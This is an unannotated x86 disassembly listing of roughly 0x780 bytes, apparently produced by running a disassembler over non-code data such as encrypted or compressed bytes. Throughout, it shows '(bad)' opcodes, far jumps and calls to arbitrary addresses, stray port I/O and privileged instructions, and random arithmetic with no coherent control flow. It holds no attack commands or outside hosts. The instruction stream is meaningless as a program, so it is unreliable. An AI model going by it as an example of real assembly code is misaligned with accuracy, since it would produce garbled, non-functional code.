  42fc94:	ss push cs
  42fc96:	stos   BYTE PTR es:[edi],al
  42fc97:	neg    ch
  42fc99:	imul   edx,DWORD PTR [edi],0x991e9267
  42fc9f:	and    ch,ah
  42fca1:	jo     0x42fc2d
  42fca3:	sub    al,0xef
  42fca5:	repz mov al,0x4b
  42fca8:	adc    al,0xb
  42fcaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcab:	and    ch,BYTE PTR [eax+0xf]
  42fcae:	adc    BYTE PTR [esi+0x138516c7],cl
  42fcb4:	or     al,0xd3
  42fcb6:	pop    ecx
  42fcb7:	repz jb 0x42fca1
  42fcba:	push   esp
  42fcbb:	daa    
  42fcbc:	or     BYTE PTR [ecx],dl
  42fcbe:	inc    edi
  42fcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcc0:	dec    esi
  42fcc1:	shl    DWORD PTR [eax-0x3050bd35],1
  42fcc7:	push   ebx
  42fcc8:	mov    dl,0xc3
  42fcca:	fstp   DWORD PTR [ecx]
  42fccc:	xchg   ecx,eax
  42fccd:	iret   
  42fcce:	js     0x42fd41
  42fcd0:	jb     0x42fcdd
  42fcd2:	jmp    0x863f:0xf125fd9d
  42fcd9:	imul   ebx,DWORD PTR [edx+0x3033e56e],0xffffffb1
  42fce0:	and    ah,BYTE PTR [eax]
  42fce2:	sahf   
  42fce3:	mov    bl,0x9
  42fce5:	ins    BYTE PTR es:[edi],dx
  42fce6:	lds    esi,FWORD PTR [ecx]
  42fce8:	mov    bh,0xf4
  42fcea:	jecxz  0x42fd19
  42fcec:	stos   DWORD PTR es:[edi],eax
  42fced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcee:	pop    ecx
  42fcef:	out    dx,al
  42fcf0:	test   BYTE PTR [ebx+0xbc5a489],0xef
  42fcf7:	add    dl,BYTE PTR [eax-0x6837ad29]
  42fcfd:	out    0x9d,eax
  42fcff:	loop   0x42fd35
  42fd01:	mov    eax,ds:0xcb8c6d38
  42fd06:	pop    ds
  42fd07:	mov    dl,0xaa
  42fd09:	mov    esi,0x34d1a718
  42fd0e:	inc    edx
  42fd0f:	sahf   
  42fd10:	mov    DWORD PTR [ecx+0x598992c1],esi
  42fd16:	loop   0x42fd3f
  42fd18:	cmp    bl,BYTE PTR [edx+0x5a]
  42fd1b:	stos   DWORD PTR es:[edi],eax
  42fd1c:	add    eax,0x44ad3682
  42fd21:	fmul   DWORD PTR [ebx+0x3f]
  42fd24:	pop    ds
  42fd25:	or     ebx,DWORD PTR [ecx]
  42fd27:	jno    0x42fd34
  42fd29:	adc    eax,0x5cb2cd51
  42fd2e:	int3   
  42fd2f:	sar    DWORD PTR [ecx-0x794dea37],cl
  42fd35:	or     edi,DWORD PTR [esi+0x75]
  42fd38:	rcr    esp,0xc1
  42fd3b:	jns    0x42fda3
  42fd3d:	adc    BYTE PTR [edx-0x2ea59dfe],bl
  42fd43:	push   ds
  42fd44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd45:	rcl    DWORD PTR [edi+eiz*4-0x6b],1
  42fd49:	lods   al,BYTE PTR ds:[esi]
  42fd4a:	sbb    ebx,DWORD PTR [esi+0x1b]
  42fd4d:	xchg   esp,eax
  42fd4e:	enter  0xb1fa,0xcd
  42fd52:	dec    esp
  42fd53:	das    
  42fd54:	icebp  
  42fd55:	jp     0x42fda2
  42fd57:	aaa    
  42fd58:	call   0x7fe94ba7
  42fd5d:	or     al,dh
  42fd5f:	je     0x42fd9c
  42fd61:	or     eax,0x6c515fa6
  42fd66:	in     al,dx
  42fd67:	mov    ebx,0x7b2a96b2
  42fd6c:	push   edi
  42fd6d:	(bad)  
  42fd6e:	out    dx,al
  42fd6f:	int3   
  42fd70:	ins    BYTE PTR es:[edi],dx
  42fd71:	or     esi,DWORD PTR [eax+0x6dc6adee]
  42fd77:	das    
  42fd78:	sub    edi,DWORD PTR [esi]
  42fd7a:	add    al,BYTE PTR [esi]
  42fd7c:	mov    dl,0x66
  42fd7e:	cmp    ch,ch
  42fd80:	cmp    edi,ebp
  42fd82:	mov    dh,0x9c
  42fd84:	pop    es
  42fd85:	or     ecx,ebp
  42fd87:	aas    
  42fd88:	sar    edi,1
  42fd8a:	xor    edx,ebp
  42fd8c:	test   DWORD PTR [eax],esp
  42fd8e:	call   0x686f:0xec1240c6
  42fd95:	xlat   BYTE PTR ds:[ebx]
  42fd96:	in     eax,0xa7
  42fd98:	das    
  42fd99:	jno    0x42fdd4
  42fd9b:	dec    eax
  42fd9c:	jo     0x42fdac
  42fd9e:	jno    0x42fdbe
  42fda0:	mov    dl,0x2d
  42fda2:	mov    al,ds:0x452c5374
  42fda7:	lahf   
  42fda8:	int3   
  42fda9:	or     edi,edx
  42fdab:	mov    dl,0x83
  42fdad:	(bad)  
  42fdb1:	ss call 0x7a3f:0xf42787c6
  42fdb9:	mov    ebp,0x4ed2a088
  42fdbe:	adc    al,0xbe
  42fdc0:	push   eax
  42fdc1:	dec    eax
  42fdc2:	or     BYTE PTR [ebx+0x52],cl
  42fdc5:	push   edx
  42fdc6:	pusha  
  42fdc7:	test   al,0xb2
  42fdc9:	mov    esp,0x274f3c94
  42fdce:	mov    bl,0xaf
  42fdd0:	lods   eax,DWORD PTR ds:[esi]
  42fdd1:	or     esi,DWORD PTR [edx+0x4364e514]
  42fdd7:	and    ah,BYTE PTR [esi-0x399a7bfc]
  42fddd:	mov    dl,0xda
  42fddf:	xor    DWORD PTR [ebp+0x52b9c512],esi
  42fde5:	or     esp,DWORD PTR [edi]
  42fde7:	sbb    DWORD PTR [edx-0x4],ecx
  42fdea:	xchg   DWORD PTR [edi],edi
  42fdec:	xor    eax,0xb22b6c25
  42fdf1:	fs inc edi
  42fdf3:	mov    cs,WORD PTR [ebx]
  42fdf5:	sub    DWORD PTR [ebp-0x74],eax
  42fdf8:	pop    eax
  42fdf9:	or     ecx,DWORD PTR [esi]
  42fdfb:	int    0x79
  42fdfd:	mov    ch,0x9e
  42fdff:	sbb    ecx,DWORD PTR [ecx+ebx*4-0x66]
  42fe03:	push   esp
  42fe04:	(bad)  
  42fe06:	(bad)  
  42fe07:	icebp  
  42fe08:	xchg   esi,eax
  42fe09:	scas   eax,DWORD PTR es:[edi]
  42fe0a:	sub    DWORD PTR [ecx+0x20c961eb],0xffffffa5
  42fe11:	or     ecx,DWORD PTR [esi]
  42fe13:	call   0xb0725aac
  42fe18:	mov    dl,0x3c
  42fe1a:	daa    
  42fe1b:	into   
  42fe1c:	mov    edx,ebx
  42fe1e:	mov    al,0xd3
  42fe20:	or     BYTE PTR es:[ebx-0x25b9786d],dh
  42fe27:	or     BYTE PTR [edx],bh
  42fe29:	xlat   BYTE PTR ds:[ebx]
  42fe2a:	les    ebp,FWORD PTR [edi+0x4a82bdbc]
  42fe30:	push   cs
  42fe31:	aad    0x1a
  42fe33:	imul   BYTE PTR [ebx+0x61]
  42fe36:	adc    eax,0x8e0b9621
  42fe3b:	iret   
  42fe3c:	xchg   ecx,eax
  42fe3d:	call   0x3fe2:0xc561d961
  42fe44:	mov    dl,0x22
  42fe46:	push   ebp
  42fe47:	adc    DWORD PTR [esi-0x22],0xed8332c9
  42fe4e:	loope  0x42fdf7
  42fe50:	xor    BYTE PTR [ebx+esi*1],ah
  42fe53:	ss mov bl,0x20
  42fe56:	or     cl,cl
  42fe58:	mov    dl,0xf
  42fe5a:	ror    BYTE PTR [ecx-0x2e463e97],0x15
  42fe61:	or     ecx,ebp
  42fe63:	xchg   ebp,eax
  42fe64:	or     edx,0x73556794
  42fe6a:	add    ah,BYTE PTR [esi]
  42fe6c:	mov    ch,0xa8
  42fe6e:	jbe    0x42fe97
  42fe70:	or     BYTE PTR [esi],bl
  42fe72:	stos   BYTE PTR es:[edi],al
  42fe73:	or     eax,0xa725ea5d
  42fe78:	jmp    0xce784f59
  42fe7d:	out    0xf6,al
  42fe7f:	adc    dh,BYTE PTR [edx-0x5460b8e5]
  42fe85:	test   eax,0xbeae842
  42fe8a:	cmp    esi,DWORD PTR [ebp-0x53]
  42fe8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe8e:	inc    eax
  42fe8f:	ret    
  42fe90:	sar    DWORD PTR [edx+ebx*4],1
  42fe93:	xor    al,0xe1
  42fe95:	push   es
  42fe96:	stos   DWORD PTR es:[edi],eax
  42fe97:	mov    dh,0x7a
  42fe99:	fwait
  42fe9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe9b:	cdq    
  42fe9c:	scas   al,BYTE PTR es:[edi]
  42fe9d:	mov    esi,0x802f1ca6
  42fea2:	jp     0x42febe
  42fea4:	xor    bl,ah
  42fea6:	adc    BYTE PTR [ebx],dh
  42fea8:	sbb    al,0x12
  42feaa:	enter  0xb0fd,0x66
  42feae:	les    esi,FWORD PTR [ecx-0x18496ccf]
  42feb4:	std    
  42feb5:	pop    esp
  42feb6:	daa    
  42feb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42feb8:	jns    0x42fec2
  42feba:	push   0x1d9769c2
  42febf:	les    esi,FWORD PTR [ebp+0x4ad2604a]
  42fec5:	inc    esp
  42fec6:	cmp    ah,BYTE PTR [ebx+0x0]
  42fec9:	adc    edx,DWORD PTR [ecx-0x61ac68bb]
  42fecf:	jbe    0x42fe89
  42fed1:	adc    ah,bl
  42fed3:	add    ch,BYTE PTR [edi]
  42fed5:	or     esp,ebp
  42fed7:	hlt    
  42fed8:	ret    
  42fed9:	dec    ecx
  42feda:	jnp    0x42fef5
  42fedc:	mov    dl,0x36
  42fede:	cmc    
  42fedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fee0:	inc    edi
  42fee1:	dec    esp
  42fee3:	ret    
  42fee4:	xlat   BYTE PTR ds:[ebx]
  42fee5:	or     BYTE PTR [edi+0x54622565],bh
  42feeb:	scas   al,BYTE PTR es:[edi]
  42feec:	jae    0x42ff0d
  42feee:	out    0x77,eax
  42fef0:	mul    cl
  42fef2:	call   0x66be:0x5b7d8285
  42fef9:	pop    eax
  42fefa:	pop    esp
  42fefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fefc:	inc    ecx
  42fefd:	jmp    0xb256:0xfcfb8c19
  42ff04:	push   esi
  42ff05:	ins    BYTE PTR es:[edi],dx
  42ff06:	(bad)  
  42ff07:	enter  0xa51,0xe
  42ff0b:	push   edi
  42ff0c:	fdivrp st(4),st
  42ff0e:	popa   
  42ff0f:	aam    0x62
  42ff11:	mov    ebx,0x25e3c7ef
  42ff16:	std    
  42ff17:	jmp    0xbce6b0e4
  42ff1c:	adc    DWORD PTR [esi],0x2ffd5b84
  42ff22:	ret    
  42ff23:	xchg   ecx,esp
  42ff25:	mov    dl,0xad
  42ff27:	call   0xe95e:0x6f950bba
  42ff2e:	pop    ecx
  42ff2f:	pusha  
  42ff30:	xchg   esp,eax
  42ff31:	arpl   WORD PTR [eax-0x2d4c65d8],bx
  42ff37:	fnstcw WORD PTR [eax+0x12014b8b]
  42ff3d:	aas    
  42ff3e:	mul    BYTE PTR [edx+edi*1-0x418ea118]
  42ff45:	push   ebx
  42ff46:	push   edx
  42ff47:	mul    BYTE PTR ds:0xd4b59aa5
  42ff4d:	(bad)  
  42ff4e:	je     0x42ffc3
  42ff50:	ret    
  42ff51:	jmp    0xf764:0x2384a7f4
  42ff58:	iret   
  42ff59:	dec    edx
  42ff5a:	(bad)  
  42ff5b:	mov    al,0xb2
  42ff5d:	jl     0x42ffcb
  42ff5f:	mov    ecx,0x5fdc6d77
  42ff64:	xchg   esi,eax
  42ff65:	or     ebx,DWORD PTR [ebp+0xc054bbc]
  42ff6b:	clc    
  42ff6c:	mov    eax,ds:0x2c8f9a9e
  42ff71:	retf   
  42ff72:	push   esi
  42ff73:	dec    esi
  42ff74:	cmp    DWORD PTR [ebx-0x51c45802],0xc5c8d647
  42ff7e:	cmp    DWORD PTR ds:0x9603abb2,esp
  42ff84:	push   eax
  42ff85:	sbb    cl,BYTE PTR [edi]
  42ff87:	in     eax,dx
  42ff88:	pop    ds
  42ff89:	or     edx,DWORD PTR [ebp-0x2b]
  42ff8c:	lock mov ds:0xbde74331,eax
  42ff92:	fwait
  42ff93:	pop    ecx
  42ff94:	jg     0x42ff9d
  42ff96:	nop
  42ff97:	and    BYTE PTR [ebp+0x32],al
  42ff9a:	jbe    0x42fffa
  42ff9c:	fisttp WORD PTR [ebx]
  42ff9e:	fimul  DWORD PTR [ecx]
  42ffa0:	lods   al,BYTE PTR ds:[esi]
  42ffa1:	loopne 0x42ff77
  42ffa3:	aaa    
  42ffa4:	scas   eax,DWORD PTR es:[edi]
  42ffa5:	out    0xeb,eax
  42ffa7:	sub    DWORD PTR [edx+0x3d89e81a],esi
  42ffad:	mov    esi,0xfcfffae
  42ffb2:	leave  
  42ffb3:	mov    ebp,0x1c98f932
  42ffb8:	stos   BYTE PTR es:[edi],al
  42ffb9:	mov    ch,0xdc
  42ffbb:	mov    eax,0xeb0372e
  42ffc0:	xor    eax,0x533142b0
  42ffc5:	retf   
  42ffc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffc7:	jmp    0x42ffc9
  42ffc9:	retf   0xc795
  42ffcc:	xchg   edi,eax
  42ffcd:	pop    ds
  42ffce:	push   edi
  42ffcf:	cmp    BYTE PTR [edx-0x5c],0xa
  42ffd3:	fucomip st,st(3)
  42ffd5:	das    
  42ffd6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffd8:	xchg   BYTE PTR [edx-0x75],bh
  42ffdb:	es aam 0x85
  42ffde:	jl     0x42ffd2
  42ffe0:	lods   al,BYTE PTR ds:[esi]
  42ffe1:	push   ebp
  42ffe2:	lahf   
  42ffe3:	xor    al,0xcb
  42ffe5:	mov    edx,DWORD PTR [ecx+0x7a]
  42ffe8:	test   al,dl
  42ffea:	push   ebx
  42ffeb:	ins    DWORD PTR es:[edi],dx
  42ffec:	pop    ds
  42ffed:	or     al,0xc9
  42ffef:	pop    ebx
  42fff0:	mov    bl,0xb5
  42fff2:	push   edi
  42fff3:	mov    ah,0xf1
  42fff5:	je     0x430039
  42fff7:	std    
  42fff8:	jle    0x430019
  42fffa:	call   0x8b4e:0x61ad5abf
  430001:	pop    es
  430002:	loop   0x42ffab
  430004:	push   ecx
  430005:	jb     0x430014
  430007:	push   edi
  430008:	mov    ds:0xc72b32d2,al
  43000d:	mov    dh,0x9a
  43000f:	mov    al,0xb5
  430011:	jl     0x43002e
  430013:	cdq    
  430014:	sub    BYTE PTR [ecx-0x24],dl
  430017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430018:	mov    ah,0xa2
  43001a:	add    al,0xe4
  43001c:	loopne 0x43007c
  43001e:	aam    0xf0
  430020:	mov    dl,0x6e
  430022:	adc    eax,0x3db4ab61
  430027:	xor    al,0x5a
  430029:	or     edx,DWORD PTR [ecx-0x7246222c]
  43002f:	push   ebx
  430030:	into   
  430031:	mov    ax,ss:0xa4f356b2
  430038:	or     DWORD PTR [ecx],esp
  43003a:	jo     0x430069
  43003c:	sbb    al,0xb
  43003e:	push   eax
  43003f:	les    edi,FWORD PTR [esi]
  430041:	xor    BYTE PTR [ebx],dh
  430043:	adc    edx,DWORD PTR [esi+0x79]
  430046:	test   BYTE PTR [ebx],dh
  430048:	rol    DWORD PTR [edx+ebx*1],0xc9
  43004c:	or     BYTE PTR [edi+0x19],ah
  43004f:	data16 adc al,0xb
  430052:	les    ebx,FWORD PTR [edi+0x30530a9d]
  430058:	xchg   ebx,eax
  430059:	in     al,dx
  43005a:	jle    0x42ffe3
  43005c:	mov    dl,0xf9
  43005e:	shl    ebp,0x82
  430061:	cdq    
  430062:	and    al,0x32
  430064:	xchg   BYTE PTR [ebx],cl
  430066:	je     0x430022
  430068:	fadd   QWORD PTR [ebp-0x44459fed]
  43006e:	call   0xa587:0x66630abe
  430075:	mov    dh,0x1d
  430077:	mov    ch,0x49
  430079:	mov    al,ds:0x5a24a70f
  43007e:	or     al,0x29
  430080:	cmp    BYTE PTR [eax],cl
  430082:	pusha  
  430083:	clc    
  430084:	mov    DWORD PTR [ebp+ebx*4+0x1d],eax
  430088:	mov    ebp,0x26d7c18b
  43008d:	ret    0xc323
  430090:	in     eax,0x5
  430092:	add    ebx,edi
  430094:	push   esp
  430095:	mov    eax,ds:0xa8eca97a
  43009a:	mov    edi,0x1d7eb2b0
  43009f:	inc    ebx
  4300a0:	nop
  4300a1:	ror    ecx,1
  4300a3:	xchg   esi,eax
  4300a4:	das    
  4300a5:	add    al,0x6e
  4300a7:	(bad)  
  4300a8:	in     al,0xb0
  4300aa:	pop    edx
  4300ab:	fistp  WORD PTR [ecx]
  4300ad:	scas   eax,DWORD PTR es:[edi]
  4300ae:	sbb    esp,DWORD PTR [ebx-0x3ee5c044]
  4300b4:	ror    ebx,1
  4300b6:	jge    0x43011f
  4300b8:	add    eax,0x77a63bdc
  4300bd:	cmp    ch,ah
  4300bf:	aam    0x4c
  4300c1:	jno    0x43011a
  4300c3:	pop    ebx
  4300c4:	jmp    0xaa2b9ad1
  4300c9:	jp     0x43008f
  4300cb:	int    0x39
  4300cd:	inc    edi
  4300ce:	dec    ebx
  4300cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4300d0:	mov    BYTE PTR [ecx+0x45],bl
  4300d3:	lds    esp,FWORD PTR [edx]
  4300d5:	pop    edx
  4300d6:	jmp    0x44d3:0x9ac5e27f
  4300dd:	inc    ebp
  4300de:	add    bh,bh
  4300e0:	sbb    eax,0x5ea0073e
  4300e5:	test   eax,0x1bca6c95
  4300ea:	jo     0x430103
  4300ec:	in     al,dx
  4300ed:	xor    al,0x9a
  4300ef:	dec    ecx
  4300f0:	sub    DWORD PTR [ecx],ecx
  4300f2:	(bad)  [edi-0x2f]
  4300f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300f6:	lds    esp,FWORD PTR [edi+0x5a9c42ea]
  4300fc:	lahf   
  4300fd:	imul   ecx,edx,0xffffff91
  430100:	mov    dl,0xe3
  430102:	enter  0xad4d,0xd0
  430106:	ds jmp 0xeebe:0xc05e053d
  43010e:	pop    ecx
  43010f:	mov    edi,0xb62e6c5
  430114:	cld    
  430115:	ins    DWORD PTR es:[edi],dx
  430116:	jmp    0xca938a23
  43011b:	and    al,0x1
  43011d:	add    al,0xfb
  43011f:	arpl   WORD PTR [edi+0x73b939ab],sp
  430125:	or     esp,DWORD PTR [ebx+0x6d72c9b6]
  43012b:	aaa    
  43012c:	sti    
  43012d:	scas   al,BYTE PTR es:[edi]
  43012e:	mov    DWORD PTR [esi+0x3997bab],esp
  430134:	add    BYTE PTR [ecx],0xad
  430137:	aaa    
  430138:	cmp    dh,BYTE PTR [edi]
  43013a:	and    eax,0x34b9eeb5
  43013f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430140:	xor    DWORD PTR [ecx+0x54],ebx
  430143:	pop    ebx
  430144:	or     ah,BYTE PTR [esi-0x1d4635e3]
  43014a:	add    al,0x25
  43014c:	mov    al,0x88
  43014e:	dec    eax
  43014f:	popa   
  430150:	push   edi
  430151:	stos   BYTE PTR es:[edi],al
  430152:	push   0x51
  430154:	xchg   edx,eax
  430155:	cmp    al,0xc5
  430157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430158:	add    esp,0x33e3c60
  43015e:	sub    edx,0x147183bc
  430164:	inc    edx
  430165:	sub    ah,BYTE PTR [esi+0x7e]
  430168:	retf   0x466d
  43016b:	pop    es
  43016c:	out    0xb,al
  43016e:	pop    ecx
  43016f:	cmp    ebp,DWORD PTR [esp+ebx*1]
  430172:	cdq    
  430173:	lds    edi,FWORD PTR [ebp-0x2]
  430176:	mov    ds:0xec0b091b,eax
  43017b:	xchg   ebp,eax
  43017c:	mov    esi,0xf65e22a3
  430181:	or     eax,DWORD PTR [ecx]
  430183:	dec    ebp
  430184:	fdiv   QWORD PTR [esp+edx*4-0x65dccd9b]
  43018b:	sub    al,0x42
  43018d:	shl    dh,1
  43018f:	push   edx
  430190:	aam    0xf9
  430192:	fsub   DWORD PTR [edi-0x4f7b464d]
  430198:	dec    esi
  430199:	inc    edi
  43019a:	mov    al,0x2f
  43019c:	mov    dl,0xc
  43019e:	mov    eax,ds:0x354dc963
  4301a3:	mov    dl,0xb4
  4301a5:	cmp    ecx,DWORD PTR [edi+esi*1-0x4a]
  4301a9:	pop    edi
  4301aa:	in     eax,0xa4
  4301ac:	mov    dl,0xc2
  4301ae:	pop    edx
  4301af:	mov    al,BYTE PTR [edx]
  4301b1:	mov    eax,ds:0xe36848a9
  4301b6:	popf   
  4301b7:	mov    edx,0x79761943
  4301bc:	add    ecx,ebx
  4301be:	pop    ebx
  4301bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301c0:	dec    ecx
  4301c1:	add    al,BYTE PTR ds:0xf3bfb3e8
  4301c7:	es xor eax,0xc2f95298
  4301cd:	aad    0x95
  4301cf:	cwde   
  4301d0:	les    ebp,FWORD PTR [edx+ebx*1]
  4301d3:	jge    0x4301ae
  4301d5:	jmp    0x430204
  4301d7:	rcr    DWORD PTR ds:0x37579a64,cl
  4301dd:	dec    esi
  4301de:	push   0xe9ecf051
  4301e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301e4:	mov    eax,0xc2e71339
  4301e9:	outs   dx,BYTE PTR ds:[esi]
  4301ea:	outs   dx,BYTE PTR ds:[esi]
  4301eb:	repnz (bad) 
  4301ed:	loop   0x430189
  4301ef:	popa   
  4301f0:	ss mov bl,0xeb
  4301f3:	jo     0x430196
  4301f5:	neg    DWORD PTR [edi]
  4301f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301f8:	(bad)  
  4301f9:	or     eax,0x51cbaccc
  4301fe:	call   0xb0a28c29
  430203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430204:	fsubr  QWORD PTR [ebx]
  430206:	inc    ebp
  430207:	push   ecx
  430208:	cmp    eax,0x5ed1b290
  43020d:	or     BYTE PTR [esi-0x2337a415],ah
  430213:	jo     0x430257
  430215:	mov    ds:0x73b37cd2,eax
  43021a:	mov    al,0x14
  43021c:	shr    BYTE PTR [edx+0x3b6e889e],1
  430222:	sub    al,0xa9
  430224:	mov    ebp,0xf258e9c2
  430229:	test   eax,0x5b03f10d
  43022e:	fwait
  43022f:	adc    eax,edi
  430231:	push   eax
  430232:	ret    
  430233:	sbb    cl,BYTE PTR [edx+eiz*8+0xb18faaa]
  43023a:	xchg   DWORD PTR [ecx-0xd],ebp
  43023d:	push   0x8eb6a143
  430242:	test   eax,0x1a47a967
  430247:	daa    
  430248:	std    
  430249:	inc    ebp
  43024a:	hlt    
  43024b:	inc    ecx
  43024c:	shl    DWORD PTR [ebx+0x24],cl
  43024f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430250:	pop    eax
  430251:	mov    esp,0xceb0338
  430256:	xchg   edx,eax
  430257:	pop    ebx
  430258:	mov    bl,0x59
  43025a:	dec    eax
  43025b:	bound  esp,QWORD PTR [ecx]
  43025d:	mov    WORD PTR [ecx+0x236f6a57],ds
  430263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430264:	stos   BYTE PTR es:[edi],al
  430265:	xchg   ebp,eax
  430266:	cli    
  430267:	adc    al,0xee
  430269:	xor    al,0x0
  43026b:	les    esi,FWORD PTR [edx+0x74b17297]
  430271:	mov    esp,0x3a0b89ad
  430277:	dec    ebx
  430278:	sub    al,0xc6
  43027a:	stos   BYTE PTR es:[edi],al
  43027b:	daa    
  43027c:	mov    ds:0x4f09d02,al
  430281:	mov    al,ds:0x1a572d2f
  430286:	pop    edx
  430287:	or     eax,0xa764876f
  43028c:	pushf  
  43028d:	cwde   
  43028e:	dec    ebp
  43028f:	jge    0x430281
  430291:	cdq    
  430292:	dec    ecx
  430293:	sbb    esi,DWORD PTR [edx-0x403961ea]
  430299:	clc    
  43029a:	jo     0x43022b
  43029c:	jae    0x4302d2
  43029e:	push   ebx
  43029f:	xchg   DWORD PTR [edx],esi
  4302a1:	pop    ss
  4302a2:	loop   0x4302b1
  4302a4:	xor    BYTE PTR [ebp-0x754adf31],dh
  4302aa:	inc    ebx
  4302ab:	jp     0x4302d6
  4302ad:	cmp    ebx,DWORD PTR [ebx+0x5ae037cd]
  4302b3:	test   al,0x81
  4302b5:	add    eax,0x68539ed5
  4302ba:	cmp    dh,BYTE PTR [edi+0x31bfbd98]
  4302c0:	mov    dl,0x34
  4302c2:	mov    dl,0xa0
  4302c4:	pop    edi
  4302c5:	test   eax,0xe98c95a0
  4302ca:	ins    DWORD PTR es:[edi],dx
  4302cb:	mov    ecx,0xe75bef0b
  4302d0:	outs   dx,DWORD PTR ds:[esi]
  4302d1:	loope  0x4302ad
  4302d3:	ret    
  4302d4:	adc    eax,0xf4443691
  4302da:	test   DWORD PTR [edi+0x7816990],esp
  4302e0:	xor    DWORD PTR [eax],ecx
  4302e2:	push   es
  4302e3:	stos   DWORD PTR es:[edi],eax
  4302e4:	stos   DWORD PTR es:[edi],eax
  4302e5:	ror    DWORD PTR [ebx+0x34],0x3a
  4302e9:	fsubr  DWORD PTR [ebx]
  4302eb:	fidiv  WORD PTR [edx+0x1413dcb8]
  4302f1:	cld    
  4302f2:	daa    
  4302f3:	add    DWORD PTR [edx],0xb
  4302f6:	jle    0x430320
  4302f8:	loop   0x4302f1
  4302fa:	pop    eax
  4302fb:	adc    eax,0xcb9aa47c
  430300:	in     eax,0x5a
  430302:	in     al,0x70
  430304:	clc    
  430305:	(bad)  
  430306:	sub    ebp,DWORD PTR [ecx-0x5fd0dcf0]
  43030c:	cmc    
  43030d:	icebp  
  43030e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43030f:	test   DWORD PTR [edi-0x20],edi
  430312:	pop    edx
  430313:	pop    esi
  430314:	das    
  430315:	inc    eax
  430316:	test   DWORD PTR [edx],eax
  430318:	mov    eax,0xd7e39abb
  43031d:	dec    ebx
  43031e:	in     al,dx
  43031f:	jno    0x43032b
  430321:	or     edi,ebx
  430323:	ror    DWORD PTR [edx+0x2b],cl
  430326:	cli    
  430327:	lods   al,BYTE PTR ds:[esi]
  430328:	push   edi
  430329:	int3   
  43032a:	call   0x368:0x50e745d0
  430331:	pop    ecx
  430332:	scas   al,BYTE PTR es:[edi]
  430333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430334:	imul   ecx,edx,0x49
  430337:	mov    ds:0x7368a720,al
  43033c:	jb     0x43034a
  43033e:	out    0x83,al
  430340:	mov    bl,0xc3
  430342:	add    ah,BYTE PTR [eax+0x46]
  430345:	mov    edi,0x3cc2d773
  43034a:	cli    
  43034b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43034c:	jecxz  0x43032c
  43034e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43034f:	shl    BYTE PTR [ecx+ebx*2+0x40b2f79e],0x48
  430357:	inc    edx
  430358:	sbb    esi,DWORD PTR ss:[ebx]
  43035b:	mov    edi,0xbd5a0b05
  430360:	mov    DWORD PTR [ecx+0x46],esp
  430363:	or     bl,BYTE PTR [eax]
  430365:	inc    esp
  430366:	call   0x7aa2:0xbecccad1
  43036d:	push   es
  43036e:	adc    DWORD PTR [edi-0x43fb8e90],esp
  430374:	and    DWORD PTR [eax],edi
  430376:	mov    bh,0xf2
  430378:	mov    dl,0x28
  43037a:	cmp    BYTE PTR [ebx],cl
  43037c:	and    al,0xf
  43037e:	xor    ebx,edx
  430380:	jbe    0x43038d
  430382:	ja     0x430378
  430384:	shl    DWORD PTR es:[ecx-0x6520d1bf],0x3e
  43038c:	nop
  43038d:	xchg   BYTE PTR [ecx+0x69],ah
  430390:	test   DWORD PTR [eax],eax
  430392:	and    ah,BYTE PTR [esi+0x40e2f5db]
  430398:	xlat   BYTE PTR ds:[ebx]
  430399:	loope  0x4303fb
  43039b:	pop    ebx
  43039c:	ja     0x4303dc
  43039e:	call   0xb831:0x742d1a26
  4303a5:	cmovge esp,DWORD PTR [ebx-0x597ddc7d]
  4303ac:	test   ebx,ecx
  4303ae:	cmp    ch,BYTE PTR [edx+0x539a15d5]
  4303b4:	loope  0x43041f
  4303b6:	add    al,0x10
  4303b8:	mov    ch,0xea
  4303ba:	or     esi,DWORD PTR [edi]
  4303bc:	repz or bh,BYTE PTR [ecx+eiz*8+0x58]
  4303c1:	fucomip st,st(2)
  4303c3:	(bad)  
  4303c5:	out    0x67,eax
  4303c7:	push   DWORD PTR [ecx-0x571c0e5]
  4303cd:	cmp    al,0x96
  4303cf:	pop    ss
  4303d0:	stos   DWORD PTR es:[edi],eax
  4303d1:	outs   dx,DWORD PTR ds:[esi]
  4303d2:	xor    al,0xa7
  4303d4:	and    cl,BYTE PTR [eax-0xb]
  4303d7:	dec    ecx
  4303d8:	inc    ebx
  4303d9:	and    bl,bl
  4303db:	cmp    ch,BYTE PTR [ebp+eax*1-0x4d8d791b]
  4303e2:	fcom   DWORD PTR [eax-0x6e9a75]
  4303e8:	inc    esp
  4303e9:	mov    eax,ds:0x87e26d9a
  4303ee:	and    eax,0x9a8433aa
  4303f3:	ss adc eax,0x9694901b
  4303f9:	inc    eax
  4303fa:	sti    
  4303fb:	dec    edi
  4303fc:	xor    cl,BYTE PTR [edx]
  4303fe:	retf   
  4303ff:	add    eax,0xbf98e7e4
  430404:	xor    eax,0xced71dfc
  430409:	fadd   DWORD PTR [ebx+edi*8]
  43040c:	mov    dl,0x3c
